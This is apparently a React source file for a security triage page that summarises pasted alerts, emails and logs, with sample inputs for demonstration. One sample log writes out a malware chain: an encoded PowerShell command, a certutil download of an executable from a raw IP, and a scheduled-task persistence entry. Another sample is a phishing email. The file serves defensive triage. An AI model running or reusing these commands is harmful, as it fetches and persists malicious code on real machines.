import { useState } from "react";
import { api } from "../api";
import { Markdown } from "../markdown";

const SAMPLES = [
  {
    label: "Phishing email",
    kind: "email",
    content:
      "From: security@acme-portal-support.co\n" +
      "Subject: URGENT: your account will be suspended\n\n" +
      "Dear customer,\n\n" +
      "We detected unusual sign-in activity on your account. Verify your account " +
      "within 24 hours or it will be permanently suspended.\n\n" +
      "Click the link to confirm your identity and reset your password:\n" +
      "http://acme-portal-support.co/verify?id=8842\n\n" +
      "Acme Security Team",
  },
  {
    label: "Impossible travel",
    kind: "alert",
    content: JSON.stringify(
      {
        alert: "impossible_travel",
        user: "alice@example.test",
        first_login: { ip: "203.0.113.5", city: "Austin", ts: "2026-10-12T18:02:11Z" },
        second_login: { ip: "198.51.100.7", city: "Bucharest", ts: "2026-10-12T18:09:44Z" },
        device: "Windows 11, Chrome 141",
        result: "success",
      },
      null,
      2,
    ),
  },
  {
    label: "Suspicious process",
    kind: "log",
    content:
      "[EDR] host FIN-WS-042, process tree:\n" +
      "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA... \n" +
      "  -> certutil -urlcache http://203.0.113.9/svchost.exe %TEMP%\\rundll32.exe\n" +
      "  -> schtasks /create /tn \"OneDriveSync\" /tr %TEMP%\\rundll32.exe\n" +
      "new outbound connection: 203.0.113.9:443 (raw IP, self-signed certificate)",
  },
  {
    label: "CounterPrompt flag",
    kind: "alert",
    content: JSON.stringify(
      {
        session: "9f2b31c0a4d1",
        source: "203.0.113.5|Scout/1.0",
        reason: "credential_exfil",
        ts: "2026-10-12T19:04:02Z",
        detail: "The site's AI agent leaked the planted credential to this source",
      },
      null,
      2,
    ),
  },
];

export function Triage() {
  const [kind, setKind] = useState("alert");
  const [content, setContent] = useState("");
  const [result, setResult] = useState(null);
  const [provider, setProvider] = useState("");
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState("");

  const submit = () => {
    if (!content.trim() || busy) return;
    setBusy(true);
    setError("");
    api("triage", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ kind, content }),
    })
      .then((next) => {
        setResult(next);
        setProvider(next.provider || "");
      })
      .catch((err) => setError(err.message))
      .finally(() => setBusy(false));
  };

  const severity = String(result?.severity || "").toLowerCase();

  return (
    <>
      <h1 className="page-title">Paste an alert. Get a triage.</h1>
      <p className="lede">
        A plain-English summary, the likely intent, and concrete next actions for any alert,
        suspicious email, or log excerpt. Sample inputs are one click away.
      </p>
      <div className="sample-row">
        {SAMPLES.map((sample) => (
          <button
            key={sample.label}
            className="btn"
            type="button"
            onClick={() => { setKind(sample.kind); setContent(sample.content); setResult(null); }}
          >
            {sample.label}
          </button>
        ))}
      </div>
      <div className="triage-form">
        <div className="triage-controls">
          <label>
            Kind
            <select value={kind} onChange={(event) => setKind(event.target.value)}>
              <option value="alert">Alert</option>
              <option value="email">Email</option>
              <option value="log">Log</option>
            </select>
          </label>
          <button className="btn primary" type="button" onClick={submit} disabled={busy || !content.trim()}>
            {busy ? "Triaging..." : "Triage"}
          </button>
        </div>
        <textarea
          value={content}
          onChange={(event) => setContent(event.target.value)}
          placeholder="Paste an alert JSON, a raw email, or a log excerpt..."
        />
      </div>
      {error ? <p className="empty">{error}</p> : null}
      {result ? (
        <section className="triage-result">
          <div className="triage-head">
            <span className={"severity " + severity}>{result.severity || "unknown"}</span>
            <span className="empty">{provider === "heuristic" ? "heuristic analyst" : "analyst model"}</span>
          </div>
          {result.summary ? <Markdown text={String(result.summary)} /> : null}
          {result.intent ? (
            <p>
              <b>Intent.</b> {result.intent}
            </p>
          ) : null}
          {Array.isArray(result.recommendations) && result.recommendations.length ? (
            <>
              <h3>Next actions</h3>
              <ul>
                {result.recommendations.map((item, index) => (
                  <li key={index}>{String(item)}</li>
                ))}
              </ul>
            </>
          ) : null}
        </section>
      ) : null}
    </>
  );
}